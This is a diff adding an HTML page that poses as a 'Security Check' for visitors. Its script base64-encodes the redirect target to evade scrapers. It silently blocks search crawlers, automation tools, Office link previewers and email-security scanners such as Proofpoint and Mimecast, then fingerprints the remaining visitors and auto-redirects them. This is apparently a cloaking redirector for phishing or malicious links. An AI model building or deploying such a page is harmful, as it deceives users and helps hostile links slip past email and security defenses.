@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta name="theme-color" content="#f6f8fc">
+<title>Redirecting…</title>
+<style>
+  :root{
+    --bg:#f6f8fc;
+    --bg-soft:#eef2f9;
+    --card:#ffffff;
+    --accent:#3b6ef6;
+    --accent-2:#7c5cff;
+    --accent-soft:#e8eeff;
+    --text:#0e1530;
+    --muted:#5f6b8a;
+    --muted-2:#98a1b8;
+    --border:#e6eaf3;
+    --ring:rgba(59,110,246,.28);
+    --success:#18a06a;
+    --warn:#d98a1a;
+    --shadow-sm:0 1px 2px rgba(16,24,60,.05);
+    --shadow-md:0 8px 24px rgba(16,24,60,.06);
+    --shadow-lg:0 20px 50px rgba(16,24,60,.10);
+    --radius:20px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    color:var(--text);
+    background:
+      radial-gradient(1100px 720px at 10% -10%, rgba(124,92,255,.09), transparent 62%),
+      radial-gradient(900px 640px at 112% 112%, rgba(59,110,246,.10), transparent 62%),
+      linear-gradient(180deg,#fbfcff 0%, var(--bg) 45%, var(--bg-soft) 100%);
+    background-attachment:fixed;
+    display:flex;align-items:center;justify-content:center;
+    padding:
+      calc(20px + env(safe-area-inset-top,0px))
+      calc(18px + env(safe-area-inset-right,0px))
+      calc(20px + env(safe-area-inset-bottom,0px))
+      calc(18px + env(safe-area-inset-left,0px));
+    min-height:100dvh;min-height:100svh;
+    line-height:1.5;
+    -webkit-font-smoothing:antialiased;
+    text-rendering:optimizeLegibility;
+  }
+
+  /* ---------- Card ---------- */
+  .card{
+    width:100%;max-width:440px;
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    padding:32px 26px 24px;
+    box-shadow:var(--shadow-lg),var(--shadow-sm);
+    text-align:center;
+    position:relative;overflow:hidden;
+    animation:cardIn .5s cubic-bezier(.22,.61,.36,1);
+  }
+  .card::before{
+    content:"";position:absolute;inset:0 0 auto 0;height:4px;
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+  }
+  @keyframes cardIn{from{opacity:0;transform:translateY(10px) scale(.99)}to{opacity:1;transform:none}}
+
+  /* ---------- Logo ---------- */
+  .logo{
+    width:56px;height:56px;margin:2px auto 16px;border-radius:16px;
+    background:linear-gradient(135deg,var(--accent),var(--accent-2));
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 10px 24px rgba(59,110,246,.26), inset 0 1px 0 rgba(255,255,255,.4);
+    position:relative;
+  }
+  .logo svg{width:26px;height:26px;display:block}
+  .logo::after{
+    content:"";position:absolute;inset:auto -6px -6px auto;
+    width:14px;height:14px;border-radius:50%;
+    background:var(--success);
+    border:3px solid var(--card);
+    box-shadow:0 2px 6px rgba(24,160,106,.35);
+  }
+
+  h1{font-size:19px;font-weight:650;letter-spacing:.1px;margin-bottom:8px}
+  p.sub{color:var(--muted);font-size:14px;line-height:1.55;margin:0 auto 22px;max-width:34ch}
+
+  /* ---------- Progress ---------- */
+  .progress-wrap{
+    width:100%;height:8px;background:var(--accent-soft);
+    border-radius:99px;overflow:hidden;margin-bottom:14px;position:relative;
+  }
+  .progress{
+    height:100%;width:0%;border-radius:99px;
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    transition:width .28s ease;position:relative;
+  }
+  .progress::after{
+    content:"";position:absolute;inset:0;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.55),transparent);
+    animation:shimmer 1.6s linear infinite;
+  }
+  @keyframes shimmer{from{transform:translateX(-100%)}to{transform:translateX(100%)}}
+
+  .status{
+    font-size:13.5px;color:var(--muted);min-height:22px;
+    font-variant-numeric:tabular-nums;
+    display:flex;align-items:center;justify-content:center;gap:6px;
+  }
+  .status b{color:var(--text);font-weight:600}
+  .status .ok{color:var(--success);font-weight:600}
+  .status .warn{color:var(--warn);font-weight:600}
+
+  .spinner{
+    width:14px;height:14px;flex:none;border-radius:50%;
+    border:2px solid var(--accent-soft);border-top-color:var(--accent);
+    animation:spin .7s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .status.done .spinner{display:none}
+
+  /* ---------- Button ---------- */
+  .btn{
+    width:100%;margin-top:22px;padding:16px 22px;
+    border:none;border-radius:14px;
+    background:linear-gradient(135deg,var(--accent),var(--accent-2));
+    color:#fff;font-size:16px;font-weight:650;font-family:inherit;
+    letter-spacing:.2px;min-height:56px;cursor:pointer;
+    display:none;align-items:center;justify-content:center;gap:8px;
+    transition:transform .12s ease, box-shadow .15s ease, filter .15s ease, opacity .15s;
+    box-shadow:0 12px 28px rgba(59,110,246,.30);
+    touch-action:manipulation;outline:none;user-select:none;
+  }
+  .btn:hover{filter:brightness(1.04);box-shadow:0 14px 32px rgba(59,110,246,.36)}
+  .btn:active{transform:scale(.985)}
+  .btn:focus-visible{box-shadow:0 0 0 4px var(--ring),0 12px 28px rgba(59,110,246,.30)}
+  .btn.show{display:inline-flex;animation:fade .3s ease}
+  .btn[disabled]{opacity:.65;cursor:default;filter:none;transform:none}
+  .btn .arrow{transition:transform .15s ease}
+  .btn:hover .arrow{transform:translateX(3px)}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  /* ---------- Footer ---------- */
+  .foot{
+    margin-top:18px;font-size:12px;color:var(--muted-2);
+    display:flex;align-items:center;justify-content:center;gap:6px;
+  }
+  .foot svg{width:12px;height:12px;opacity:.75}
+
+  /* ---------- Small screens ---------- */
+  @media (max-width:380px){
+    .card{padding:26px 20px 20px;border-radius:18px}
+    h1{font-size:17.5px}
+    p.sub{font-size:13.5px}
+    .logo{width:52px;height:52px;border-radius:14px}
+    .logo svg{width:24px;height:24px}
+    .btn{min-height:54px;font-size:15.5px}
+  }
+
+  /* ---------- Landscape / short height ---------- */
+  @media (max-height:560px) and (orientation:landscape){
+    body{align-items:flex-start;padding-top:calc(14px + env(safe-area-inset-top,0px))}
+    .card{padding:22px 22px 18px}
+    .logo{width:46px;height:46px;margin-bottom:12px}
+    h1{font-size:17px;margin-bottom:4px}
+    p.sub{margin-bottom:16px;font-size:13px}
+    .btn{margin-top:16px;min-height:50px}
+    .foot{margin-top:12px}
+  }
+
+  @media (prefers-reduced-motion:reduce){
+    *,*::before,*::after{animation-duration:.001ms !important;animation-iteration-count:1 !important;transition-duration:.001ms !important}
+    .progress::after{display:none}
+  }
+</style>
+</head>
+<body>
+
+<main class="card" role="main" aria-labelledby="title">
+  <div class="logo" aria-hidden="true">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 3.2 4.8 6.3v5.2c0 4.4 3 8.2 7.2 9.3 4.2-1.1 7.2-4.9 7.2-9.3V6.3L12 3.2Z"
+            stroke="#fff" stroke-width="1.7" stroke-linejoin="round"/>
+      <path d="m9 12.1 2.1 2.1L15.2 10"
+            stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+
+  <h1 id="title">Security Check</h1>
+  <p class="sub">Confirming you're a real visitor.<br>This takes just a second.</p>
+
+  <div class="progress-wrap" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" id="barWrap">
+    <div class="progress" id="bar"></div>
+  </div>
+
+  <div class="status" id="status" aria-live="polite">
+    <span class="spinner" aria-hidden="true"></span>
+    <span id="statusText">Initializing…</span>
+  </div>
+
+  <button class="btn" id="goBtn" type="button" rel="noopener">
+    <span>Continue</span>
+    <span class="arrow" aria-hidden="true">→</span>
+  </button>
+
+  <div class="foot">
+    <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+      <path d="M7 10V7.5a5 5 0 0 1 10 0V10" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+      <rect x="4.5" y="10" width="15" height="10" rx="2.2" stroke="currentColor" stroke-width="1.8"/>
+    </svg>
+    Secure redirect
+  </div>
+</main>
+
+<script>
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const CONFIG = {
+  // Base64-encoded destination. Decoded only in-memory at redirect time.
+  // (Not real security, but raises the bar for naive HTML/regex scrapers.)
+  targetUrlB64: "aHR0cHM6Ly9tZXJpZGlhbi1odWIucHJvLw==",
+
+  minDelay: 1500,          // ms — minimum wait before Continue appears
+  maxDelay: 2500,          // ms — maximum wait
+  autoRedirect: true,      // auto-redirect once verified & user interacted
+  autoRedirectDelay: 500,  // ms — grace period so user sees the button
+  fallbackTimeout: 7000,   // ms — hard redirect even if user did nothing
+  requireInteraction: false // if true, only user click triggers redirect
+};
+
+/* ============================================================
+   Helpers
+   ============================================================ */
+const decodeB64 = (s) => {
+  try {
+    // atob → UTF-8 safe
+    return decodeURIComponent(escape(atob(s)));
+  } catch { return ""; }
+};
+
+/* ============================================================
+   Main
+   ============================================================ */
+(function () {
+  "use strict";
+
+  const $bar        = document.getElementById('bar');
+  const $barWrap    = document.getElementById('barWrap');
+  const $status     = document.getElementById('status');
+  const $statusText = document.getElementById('statusText');
+  const $btn        = document.getElementById('goBtn');
+
+  /* ----------------------------------------------------------
+     SOFT bot heuristics
+     We never *block* — we only lower the confidence score.
+     A human with privacy extensions must NEVER be punished.
+     ---------------------------------------------------------- */
+  let suspicion = 0;      // 0 = clean, higher = more bot-like
+  const reasons = [];
+
+  // 1. Known bot/crawler User-Agents → hard silent exit (these never convert anyway)
+  const ua = navigator.userAgent || "";
+  const hardBotPatterns = [
+    /googlebot/i, /bingbot/i, /bingpreview/i, /yandexbot/i,
+    /duckduckbot/i, /baiduspider/i, /slurp/i, /sogou/i,
+    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+    /telegrambot/i, /whatsapp/i, /discordbot/i,
+    /curl\//i, /wget\//i, /python-requests/i, /python-urllib/i,
+    /go-http-client/i, /java\//i, /libwww-perl/i, /httpclient/i,
+    /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i,
+    /googleimageproxy/i, /yahoomailproxy/i,
+    /ms-office/i, /microsoft office/i,
+    /barracuda/i, /proofpoint/i, /mimecast/i
+  ];
+  for (const p of hardBotPatterns) {
+    if (p.test(ua)) return; // silent — no redirect, no content
+  }
+
+  // 2. Automation flags — count as suspicion, do NOT block.
+  //    (Some real users have webdriver=true in embedded browsers.)
+  if (navigator.webdriver === true) { suspicion += 3; reasons.push('webdriver'); }
+
+  // 3. Language + platform sanity
+  if (!navigator.language) { suspicion += 1; reasons.push('no-lang'); }
+  if (!navigator.platform) { suspicion += 1; reasons.push('no-platform'); }
+
+  // 4. Screen / viewport sanity (bots often report 0 or absurd sizes)
+  if (!screen.width || !screen.height) { suspicion += 1; reasons.push('no-screen'); }
+  if (window.innerWidth === 0 || window.innerHeight === 0) { suspicion += 1; reasons.push('no-viewport'); }
+
+  // 5. Plugin / mimeType fingerprint (real browsers usually report at least one)
+  try {
+    const plugins = navigator.plugins ? navigator.plugins.length : 0;
+    const mimes   = navigator.mimeTypes ? navigator.mimeTypes.length : 0;
+    if (plugins === 0 && mimes === 0) { suspicion += 1; reasons.push('no-plugins'); }
+  } catch {}
+
+  // 6. Timezone vs. offset mismatch (headless often misconfigured)
+  try {
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    if (!tz) { suspicion += 1; reasons.push('no-tz'); }
+  } catch { suspicion += 1; reasons.push('tz-error'); }
+
+  /* ----------------------------------------------------------
+     Human activity tracking — MANY signal types, weighted.
+     We require N independent signals to be confident it's human.
+     ---------------------------------------------------------- */
+  let humanSignals = 0;
+  const humanSignalSet = new Set();
+
+  function addSignal(name, weight = 1) {
+    if (humanSignalSet.has(name)) return;
+    humanSignalSet.add(name);
+    humanSignals += weight;
+  }
+
+  // Passively observe real interaction
+  window.addEventListener('pointerdown', () => addSignal('pointerdown'), {passive:true, once:false});
+  window.addEventListener('touchstart',  () => addSignal('touchstart', 1), {passive:true, once:false});
+  window.addEventListener('mousemove',   () => addSignal('mousemove'),   {passive:true, once:false});
+  window.addEventListener('keydown',     () => addSignal('keydown'),     {passive:true, once:false});
+  window.addEventListener('scroll',      () => addSignal('scroll'),      {passive:true, once:false});
+  window.addEventListener('wheel',       () => addSignal('wheel'),       {passive:true, once:false});
+
+  // Mouse movement with actual delta (headless often fires 0,0)
+  let lastX = null, lastY = null;
+  window.addEventListener('mousemove', (e) => {
+    if (lastX !== null && (Math.abs(e.clientX - lastX) + Math.abs(e.clientY - lastY)) > 2) {
+      addSignal('mousemove-real', 2);
+    }
+    lastX = e.clientX; lastY = e.clientY;
+  }, {passive:true});
+
+  // A touch with real coordinates
+  window.addEventListener('touchstart', (e) => {
+    const t = e.touches && e.touches[0];
+    if (t && (t.clientX || t.clientY)) addSignal('touch-real', 2);
+  }, {passive:true});
+
+  // Visibility / focus — real users keep the tab visible
+  if (document.hasFocus()) addSignal('focus', 1);
+  window.addEventListener('focus', () => addSignal('focus', 1), {once:true});
+  document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'visible') addSignal('visible', 1);
+  });
+
+  /* ----------------------------------------------------------
+     Progress + verification gate
+     ---------------------------------------------------------- */
+  const total = CONFIG.minDelay + Math.random() * (CONFIG.maxDelay - CONFIG.minDelay);
+  const start = performance.now();
+  let ready   = false;
+  let redirected = false;
+
+  function setStatus(html, done) {
+    $statusText.innerHTML = html;
+    $status.classList.toggle('done', !!done);
+  }
+
+  function tick() {
+    const elapsed = performance.now() - start;
+    const pct = Math.min(100, (elapsed / total) * 100);
+    $bar.style.width = pct.toFixed(1) + "%";
+    $barWrap.setAttribute('aria-valuenow', Math.round(pct));
+
+    if (elapsed < total) { requestAnimationFrame(tick); return; }
+    if (ready) return;
+    ready = true;
+    $bar.style.width = "100%";
+    $barWrap.setAttribute('aria-valuenow', 100);
+
+    /* ---- Soft decision ----
+       We NEVER block. We adjust the UX:
+       - clean human  → show button + auto-redirect
+       - uncertain    → show button, NO auto-redirect (still 1 tap → go)
+       - suspicious   → show button, require explicit click (still 1 tap → go)
+       Even the most suspicious visitor gets through with one tap.
+    */
+    const humanScore  = humanSignals;
+    const botScore    = suspicion;
+
+    let verdict, message, autoOk;
+
+    if (botScore >= 4 && humanScore < 2) {
+      verdict  = 'suspicious';
+      message  = 'Tap the button to continue';
+      autoOk   = false;
+    } else if (humanScore >= 2 && botScore < 4) {
+      verdict  = 'human';
+      message  = '<span class="ok">You may proceed ✓</span>';
+      autoOk   = true;
+    } else {
+      verdict  = 'uncertain';
+      message  = 'Tap the button to continue';
+      autoOk   = false;
+    }
+
+    // Never punish a user just because they haven't moved yet — if 1.5s+ passed
+    // and they're still on the page, they're at least a real visitor. So we only
+    // *require* interaction if suspicion is high AND signals are truly zero.
+    if (humanScore === 0 && botScore >= 5) {
+      verdict = 'suspicious';
+      autoOk  = false;
+    }
+
+    setStatus(message, true);
+    $btn.classList.add('show');
+    try { $btn.focus({preventScroll:true}); } catch {}
+
+    // Auto-redirect only for confident-human verdicts
+    if (CONFIG.autoRedirect && autoOk && !CONFIG.requireInteraction) {
+      setTimeout(() => { if (!redirected) redirect(); }, CONFIG.autoRedirectDelay);
+    }
+  }
+  requestAnimationFrame(tick);
+
+  /* ----------------------------------------------------------
+     Fallback — no human left behind.
+     Even zero-signal suspicious clients get through after a short wait,
+     because a human on a privacy-hardened browser must not be stuck.
+     ---------------------------------------------------------- */
+  setTimeout(() => { if (!redirected) redirect(); }, CONFIG.fallbackTimeout);
+
+  /* ----------------------------------------------------------
+     Redirect
+     ---------------------------------------------------------- */
+  function redirect() {
+    if (redirected) return;
+    redirected = true;
+    $btn.disabled = true;
+    $btn.style.opacity = ".65";
+    setStatus('<span class="spinner" aria-hidden="true"></span> Redirecting…', false);
+
+    const target = decodeB64(CONFIG.targetUrlB64);
+    if (!target) return;
+
+    try { window.location.replace(target); }
+    catch (e) { window.location.href = target; }
+  }
+
+  $btn.addEventListener('click', (e) => {
+    e.preventDefault();
+    redirect();
+  });
+
+  // Keyboard: Enter / Space already handled by button semantics.
+  // Also allow the whole card to trigger redirect if the user taps anywhere
+  // on it AFTER verification — but only on the button itself to keep intent clear.
+})();
+</script>
+</body>
+</html>
